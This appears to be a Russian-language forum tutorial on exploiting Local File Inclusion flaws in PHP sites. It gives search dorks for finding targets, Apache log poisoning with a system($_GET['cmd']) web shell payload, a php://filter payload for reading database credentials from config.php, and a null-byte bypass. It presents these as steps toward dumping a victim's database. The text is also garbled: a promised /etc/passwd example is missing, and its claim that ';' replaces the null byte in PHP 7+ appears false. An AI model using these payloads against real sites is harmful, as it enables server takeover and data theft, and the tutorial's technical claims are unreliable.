дорки 
1. inurl:index.php?page=
2. inurl:index.php?inc=
3. inurl:index.php?view=
4. inurl:view.php?page=
5. inurl:index.php?include=​

что такое LFI уязвимости
​
LFI (Local File Inclusion, или же подключение локального файла) - это уязвимости, которые позволяют просматривать содержимое локальных файлов на сервере, при помощи специального HTTP запроса, при этом любой php код в содержимом файла будет выполнен.
​
пример уязвимого сервера:
https://example.com/index.php?page=main.php​

когда пользователь заходит на сайт, на сервере происходит подключение файла main.php (функция include в примере кода выше), затем в main.php выполняется php код, если он имеется, и в конце концов, результат отправляется пользователю.​


но самое интересное происходит, когда мы попытаемся подключить НЕ php файл
​
вот тут то и проявляется уязвимость LFI. если пользователь вместо main.php, укажет что-то в духе /etc/passwd, то мы можем увидеть следующее:

у сервера apache по умолчанию они располагаются по одному из следующих путей:​
1. /var/log/apache/access.log
2. /etc/httpd/****/access.log
3. /var/log/apache2/access.log​
​
таким образом, если мы отправим запрос на:​
GET /index.php?page=<?php echo system('ls /'); ?>
​
то сервер запишет это в файл с логами, а как только мы попытаемся посетить файл с логами, вместо:​
<?php echo system('ls /'); ?>​

мы увидим список файлов и директорий в корневом каталоге, т.к. указанный нами php код будет выполнен, и вместо пейлоада мы увидим результат выполнения команды ls /.

при помощи этого способа можно выполнять любые команды на сервере, а если ты обладаешь какими никакими знаниями языка [plain]php[/plain], то сможешь составить подобный пейлоад:
<?php echo system($_GET['cmd']); ?>
​
который сэкономит кучу времени:
вместо того, чтобы каждый раз пробрасывать пейлоад с выполнением той или иной команды, мы можем использовать один, и для того, чтобы выполнить команду, мы просто добавим в [plain]запрос[/plain] параметр:​
?cmd=xxx​
где xxx - команда, которая будет выполнена.

при помощи этого способа мы сможем просматривать содержимое php файлов. практически все сайты взаимодействуют со своей базой данных, и зачастую, на сервере существуют конфигурационные файлы, которые содержат такие данные, как:​
1. айпи адрес сервера субд
2. порт сервера субд
3. имя базы данных
4. имя пользователя субд
5. пароль пользователя субд
​
и так, для того, чтобы просмотреть содержимое php файла, используем следующий пейлоад:
/index.php?page=php://filter/read=convert.base64-encode/resource=config.php​
​
где вместо config.php мы указываем любой интересующий вас php файл.

после получения данных от субд, мы можем подключиться к ней, и выкачать всю интересующую нас информацию.

​
способ на случай, если что-то не работает
​
данный способ поможет, если в коде встречается что-то в этом роде:​
Код PHP:
<?php
// ...
include($page . '.php');
// ...
?>


в данном случае если вы попробуете открыть файл лога, ничего не выйдет.
это происходит, потому что к параметру page подставляется ".php", из-за этого сервер подключает не access.log, а access.log.php, которого на этом самом сервере нет (следовательно, файла мы не увидим).
​
данная проблема обходится очень просто:
​
в языке программирования php конец строки обозначается нулевым байтом (0x0, или же \0). в HTML этот символ кодируется, как %00.
если мы добавим его в конец нашего пейлоада, то выйдет нечто подобное:​
/index.php?page=/.../access.log%00
​
в таком случае, когда сервер добавит ".php" в конец нашего пейлоада, у него получится следующая строка:​
"/.../access.log\0.php"​

из-за того, что в середине нашей строки есть спец.символ \0, php будет думать, что она заканчивается после символа "g", и сервер отправит нам следующий файл:​
/.../access.log​

upd: в версиях php 7 и выше, сделать это можно и символом ";". он сработает примерно так-же, как и нулевой байт.

​